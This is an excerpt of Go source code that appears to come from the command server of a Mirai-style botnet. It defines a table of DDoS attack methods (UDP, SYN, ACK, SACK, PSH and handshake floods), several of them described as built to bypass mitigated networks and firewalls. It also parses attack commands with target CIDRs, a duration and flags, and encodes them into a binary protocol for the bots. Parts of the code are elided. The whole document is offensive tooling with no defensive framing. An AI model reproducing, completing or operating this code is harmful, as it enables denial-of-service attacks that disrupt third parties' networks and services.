...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "vseflood": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7, 28, 29 },
        " 'VSEFLOOD' a UDP flood attack, where the function 'attack_udp_vse' repeatedly sends a large number of UDP packets to specified targets, overwhelming their network or server and potentially.",
    },
    "synflood": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 28, 29 },
        " 'SYNFLOOD' a tcp syn flood, with flags (URG, ACK, PSH, RST, SYN, FIN), and various TCP options (MSS, SACK permitted, timestamps, window scale).",
    },
    "ackflood": AttackInfo {
        3,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 28, 29 },
        " 'ACKFLOOD' sends TCP packets to the target addresses indefinitely. Within the loop, for each target address, it creates a packet by setting the IP and TCP header fields, as well as generating random payload data.",
    },
    "udpflood": AttackInfo {
        4,
        []uint8 {0, 1, 7, 28, 29 },
        " 'UDPFLOOD' a plain udp flood, It simply sends UDP packets repeatedly to the specified targets.",
    },
    "udphex": AttackInfo {
        5,
        []uint8 {0, 1, 7, 28, 29 },
        " 'UDPHEX' a complex udp hex flood aims to flood multiple targets with UDP packets, potentially causing network congestion or service disruption.",
    },
    "tcpsack": AttackInfo {
        6,
        []uint8 {0, 1, 7, 28, 29 },
        " 'TCPSACK' a TCP flood made to bypass mitigated networks/firewalls, TCPSACK uses TCP options (MSS, SACK, TSVAL, WSS), etc.",
    },
    "udprand": AttackInfo {
        7,
        []uint8 {2, 3, 4, 5, 6, 7, 28, 29 },
        " 'UDPRAND' implements a UDP flooding attack. It creates multiple sockets and sends UDP packets with random payloads to multiple target addresses. The purpose of this attack is to overwhelm the target's network resources and disrupt its services",
    },  
    "socket": AttackInfo {
        8,
        []uint8 { 0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 28, 29 },
        " 'SOCKET' implements a TCP flood attack. The purpose of this function is to continuously establish TCP connections and send data to a specified target.",
    }, 
    "tcpstream": AttackInfo {
        9,
        []uint8 { 0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 28, 29 },
        " 'TCPSTREAM' implements a TCP flood attack by sending a continuous stream of TCP packets to multiple targets, with various options and randomized fields.",
    },
    "handshake": AttackInfo {
        10,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 28, 29 },
        " 'HANDSHAKE' receives a SYN+ACK packet from the target, then it extracts relevant information such as IP address, sequence numbers, source port, and destination port. It then sets up a packet based on this information and stores it in the pkts array",
    },
    "tcppsh": AttackInfo {
        11,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        " 'TCPPSH' \"TCPDataPushFlood.\" It involves flooding the target with TCP packets containing the PSH flag, potentially causing the target's application layer to be overwhelmed by immediate data delivery requests.",
    },
    "udpwizard": AttackInfo {
        12,
        []uint8 {0, 1, 7, 26, 27, 28, 29},
        " 'UDPWIZARD' UDP flood with less options. optimized for bypassing hosts, also uses many techniques such as random payloads,It sets up the attack parameters, like the source and destination ports, payload size, and even custom payloads",
    },
    "wraflood": AttackInfo {
        13,
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    // Parse attack name
    if len(args) == 0 {
        return nil, errors.New("\033[31mMust specify an attack name")
    } else {
        var exists bool
    ...
    if len(args) == 0 {
        ...
        if len(cidrArgs) > 255 {
            return nil, errors.New("\033[31mCannot specify more than \033[0m255 \033[31mtargets in a single attack!")
        }
        for _,cidr := range cidrArgs {
            ...
            if len(cidrInfo) == 0 {
                return nil, errors.New("\033[31mBlank target specified!")
            }
            prefix = cidrInfo[0]
            if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("\033[31mInvalid netmask was supplied, near %s", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("\033[31mToo many /'s in prefix, near %s", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("\033[31mFailed to parse IP address, near %s", cidr))
            }
    ...
    if len(args) == 0 {
        return nil, errors.New("\033[31mMust specify an attack duration")
    } else {
        if args[0] == "?" {
    ...
    for len(args) > 0 {
        ...
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("\033[31mInvalid key=value flag combination near %s", args[0]))
        }
        ...
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("\033[31mInvalid flag key \033[0m%s\033[31m, near \033[31m%s", flagSplit[0], args[0]))
        }
        if flagSplit[1][0] == '"' {
    ...
    if len(atk.Flags) > 255 {
        return nil, errors.New("\033[31mCannot have more than 255 flags")
    }
...
func (this *Attack) Build_Stoprep() ([]byte, error) {
	buf := make([]byte, 0)
	buf = append(buf, byte('\xFE'))
	tmp := make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
...
func (this *Attack) Build_Startrep() ([]byte, error) {
	buf := make([]byte, 0)
	buf = append(buf, byte('\xFF'))
	tmp := make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)
	return buf, nil
...
func (this *Attack) Build() ([]byte, error) {
    ...
    for key,val := range this.Flags {
        ...
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("\033[31mFlag value cannot be more than 255 bytes!")
        }
